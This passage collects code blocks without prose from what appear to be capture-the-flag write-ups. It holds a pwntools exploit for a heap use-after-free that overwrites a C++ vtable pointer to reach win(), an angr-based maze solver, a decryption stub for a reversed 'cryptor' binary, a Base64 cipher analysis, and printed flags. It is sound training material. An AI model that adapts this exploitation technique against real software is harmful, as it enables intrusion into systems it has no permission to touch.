<pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh">c  
<span class="token number">3</span>  
<span class="token number">16</span>  
AABBCCDD</code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh">^C  
heap chunks</code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># downloaded[0] = new forensics;   (vptr points to forensic's vtable.)</span>
download_chal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Chunk is allocated-- reusing the chunk previously deallocated.</span>
<span class="token comment"># Overwrite vptr of downloaded[0] with &amp;(&amp;win).</span>
submit_writeup<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>

<span class="token comment"># downloaded[0]-&gt;solve() triggers double dereference (due to virtual function resolution) and calls win()!</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

binary <span class="token operator">=</span> <span class="token string">'ctf_sim'</span>

context<span class="token punctuation">.</span>binary <span class="token operator">=</span> binary
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"tamuctf.com"</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token string">"ctf-sim"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">download_chal</span><span class="token punctuation">(</span>category<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> save_index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;=</span> category <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> save_index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>save_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve_chal</span><span class="token punctuation">(</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">submit_writeup</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> length <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> length<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"your math bad bad"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token string">b'\n'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad newline"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token comment"># downloaded[0] = new forensics;   (vptr points to forensic's vtable.)</span>
download_chal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Chunk is allocated-- reusing the chunk previously deallocated.</span>
<span class="token comment"># Overwrite vptr of downloaded[0] with &amp;(&amp;win).</span>
submit_writeup<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>

<span class="token comment"># downloaded[0]-&gt;solve() triggers double dereference (due to virtual function resolution) and calls win()!</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">gigem{h34pl355_1n_53477l3}</code></pre>
<pre data-label="solver-template.py" class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"tamuctf.com"</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token string">"labyrinth"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> binary <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"elf"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token comment"># send whatever data you want</span>
  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"howdy"</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="command-line language-sh" data-prompt="$" data-output="2-7" tabindex="0"><code class="language-sh">checksec elf
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/Users/&lt;redacted&gt;/labyrinth/elf'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'elf'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>

    <span class="token comment"># Find target address.</span>
    start_addr <span class="token operator">=</span> <span class="token number">0x4011b3</span>
    tar_addr <span class="token operator">=</span> <span class="token number">0x4011c8</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py">state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_addr<span class="token punctuation">)</span> <span class="token comment"># Construct the state when we "start" the executable at `start_addr`.</span>
simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token comment"># Get a simulation manager. This will... manage our simulations.</span>
simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>tar_addr<span class="token punctuation">)</span>  <span class="token comment"># GOGOGO!!!</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Construct a CFG from the 1000 functions. </span>
<span class="token comment"># Restrict analysis to the relevant region to save time.</span>
region <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0x401155</span><span class="token punctuation">,</span> <span class="token number">0x400000</span> <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_csu_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
cfg <span class="token operator">=</span> p<span class="token punctuation">.</span>analyses<span class="token punctuation">.</span>CFGFast<span class="token punctuation">(</span>regions<span class="token operator">=</span>region<span class="token punctuation">)</span>

<span class="token comment"># Get networkx nodes for start and target addresses in CFG.</span>
src_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span>model<span class="token punctuation">.</span>get_any_node<span class="token punctuation">(</span>start_addr<span class="token punctuation">,</span> anyaddr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
tar_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span>model<span class="token punctuation">.</span>get_any_node<span class="token punctuation">(</span>tar_addr<span class="token punctuation">,</span> anyaddr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment"># Ensure nodes exist. shortest_path works differently if a node is None.</span>
<span class="token keyword">assert</span> src_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> tar_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>

<span class="token comment"># Construct the shortest path from src to tar. This will be a list of CFGNodes.</span>
<span class="token keyword">from</span> networkx <span class="token keyword">import</span> shortest_path
path <span class="token operator">=</span> shortest_path<span class="token punctuation">(</span>cfg<span class="token punctuation">.</span>graph<span class="token punctuation">,</span> src_node<span class="token punctuation">,</span> tar_node<span class="token punctuation">)</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Walk through the rest of the path.</span>
state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_addr<span class="token punctuation">)</span>
<span class="token keyword">for</span> node <span class="token keyword">in</span> path<span class="token punctuation">:</span>
    <span class="token comment"># Let the simulator engine works its magic.</span>
    simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>node<span class="token punctuation">.</span>addr<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span>
    
    <span class="token comment"># Keep the found state for next iteration.</span>
    state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Get input which will get us from main to exit(0).</span>
chain <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">return</span> chain</code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> networkx <span class="token keyword">import</span> shortest_path
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'elf'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>

    <span class="token comment"># Find target address.</span>
    start_addr <span class="token operator">=</span> <span class="token number">0x4011b3</span>
    tar_addr <span class="token operator">=</span> <span class="token number">0x4011c8</span>

    <span class="token comment"># Construct a CFG from the 1000 functions.</span>
    <span class="token comment"># Restrict analysis to the relevant region to reduce time.</span>
    region <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0x401155</span><span class="token punctuation">,</span> <span class="token number">0x400000</span> <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_csu_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    cfg <span class="token operator">=</span> p<span class="token punctuation">.</span>analyses<span class="token punctuation">.</span>CFGFast<span class="token punctuation">(</span>regions<span class="token operator">=</span>region<span class="token punctuation">)</span>

    <span class="token comment"># Get networkx nodes for start and target addresses in CFG.</span>
    src_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span>model<span class="token punctuation">.</span>get_any_node<span class="token punctuation">(</span>start_addr<span class="token punctuation">,</span> anyaddr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    tar_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span>model<span class="token punctuation">.</span>get_any_node<span class="token punctuation">(</span>tar_addr<span class="token punctuation">,</span> anyaddr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    <span class="token comment"># Ensure nodes exist. shortest_path works differently if a node is None.</span>
    <span class="token keyword">assert</span> src_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> tar_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>

    <span class="token comment"># Construct the shortest path from src to tar. This will be a list of CFGNodes.</span>
    path <span class="token operator">=</span> shortest_path<span class="token punctuation">(</span>cfg<span class="token punctuation">.</span>graph<span class="token punctuation">,</span> src_node<span class="token punctuation">,</span> tar_node<span class="token punctuation">)</span>

    <span class="token comment"># Walk through the rest of the path.</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_addr<span class="token punctuation">)</span>
    <span class="token keyword">for</span> node <span class="token keyword">in</span> path<span class="token punctuation">:</span>
        <span class="token comment"># Let the simulator engine works its magic.</span>
        simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
        simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>node<span class="token punctuation">.</span>addr<span class="token punctuation">)</span>
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span>
        
        <span class="token comment"># Keep the found state for next iteration.</span>
        state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token comment"># Get input which will get us from main to exit(0).</span>
    chain <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span>

    <span class="token keyword">return</span> chain


p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"tamuctf.com"</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token string">"labyrinth"</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> binary <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Read input and save as binary.</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"elf"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment"># Solve and print.</span>
    out <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>out<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">gigem{w0w_y0ur3_r34lly_600d_w17h_m4z35}</code></pre>
<pre class="language-bash" tabindex="0"><code class="language-bash">strings cryptor-exe <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-Ev</span> <span class="token string">'^_Z.*'</span> <span class="token comment"># Filter out most C++ symbols. (Manually leaf through the rest.)</span>
strings cryptor-exe <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'/'</span>         <span class="token comment"># Search for endpoint or MIME type.</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">uint32_t</span> st<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// Obtained from binary (static_key symbol).</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf2\x9c\x0b\xf1\xc5\x1a\x7e\x65\x75\x80\x23\x6e\x8b\x74\x38\xbf\x59\x39\x8a\x1a\x05\xc6\x43\xfa\x1d\x57\x82\x0a\xb9\xc6\xdc\x50"</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Obtained by decoding Base64.</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> iv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xe2\x4f\x76\x18\xd8\xa3\xa\xaf\xa8\xbf\xee\xe6\x5c\xe9\x4\x1e"</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tag<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xd0\x5b\x4c\x60\x6d\x88\x3f\x18\xff\xa8\x58\x43\xfc\xd2\xc6\xac"</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xe4\xa\xf2\xb3\x96\x3c\x7a\x9a\x86\xe1\xa4\x9e\x45\xc5\xef\x7f\xe4\x8a\x96\x13\x4a\x95\x8\xc8\xdb\x6c\x7c\xa2\x34\x6f\xf4\x37\xae\xd0\x46\x1\xb2\xd0\xc\x32\xbb\x3e\xb6\xf9\xe6\x51\x5e\x6e\x14\xb\x97\x5b\x99\xd\xda\x3a\xf3\xe0\xd2\x66\xed\xe8\x7a\xbc\x6e\xc\xab\xec"</span><span class="token punctuation">;</span>
    
    <span class="token function">uc_state_init</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">uc_decrypt</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span> c<span class="token punctuation">,</span> len<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"result: %d\n"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">hkcert22{n3v3r_s4w_4n_c++_ap1_s3Rv3R?m3_n31th3r_bb4t_17_d0e5_eX15ts}</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">encrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>charmap<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> encoded<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>

<span class="token keyword">def</span> <span class="token function">get_chars_with_mask</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Get Base64 chars which are masked with m."""</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>c <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> m<span class="token punctuation">)</span> <span class="token operator">==</span> m<span class="token punctuation">}</span>

<span class="token comment"># List the 4 Base64 positions. We'll cycle through these positions (i.e. i % 4).</span>
msbs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0b100000</span><span class="token punctuation">,</span> <span class="token number">0b001000</span><span class="token punctuation">,</span> <span class="token number">0b000010</span><span class="token punctuation">,</span> <span class="token number">0b000000</span><span class="token punctuation">]</span>

<span class="token comment"># Get impossible characters for each position.</span>
subchars <span class="token operator">=</span> <span class="token punctuation">[</span>get_chars_with_mask<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> msbs<span class="token punctuation">]</span>

<span class="token comment"># Create a blacklist for each Base64 char.</span>
<span class="token comment"># e.g. blacklist['A'] returns the set of chars which 'A' can NOT map to.</span>
blacklist <span class="token operator">=</span> <span class="token punctuation">{</span>c<span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">}</span>

<span class="token comment"># Loop through each char in the shuffled Base64 text.</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Ignore char mappings which have '1' in corresponding msb.</span>
    <span class="token comment"># These can't map to a printable ASCII char.</span>
    blacklist<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">|</span><span class="token operator">=</span> subchars<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span>

<span class="token comment"># Invert the blacklist to get a dictionary of possible mappings.</span>
<span class="token comment"># e.g. whitelist['A'] returns the set of chars which 'A' CAN map to.</span>
whitelist <span class="token operator">=</span> <span class="token punctuation">{</span>k<span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span> <span class="token operator">-</span> v <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> blacklist<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># '+/0123456789CDGHKLOPSTWXabefghijklmnopqrstuvwxyz'</span></code></pre>
